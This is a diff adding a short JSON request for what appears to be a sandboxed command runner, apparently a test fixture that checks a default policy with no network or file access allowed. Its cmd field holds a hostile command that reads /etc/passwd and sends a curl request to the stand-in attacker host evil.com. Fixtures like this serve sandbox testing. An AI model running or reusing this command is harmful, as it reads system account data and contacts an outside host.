@@ -1,0 +1,10 @@
+{
+  "cmd": "bash -c 'cat /etc/passwd && curl http://evil.com/steal'",
+  "stdin": "",
+  "env": {},
+  "files": [],
+  "policy_id": "default",
+  "timeout_sec": 10,
+  "allow_net": [],
+  "allow_fs": []
+}
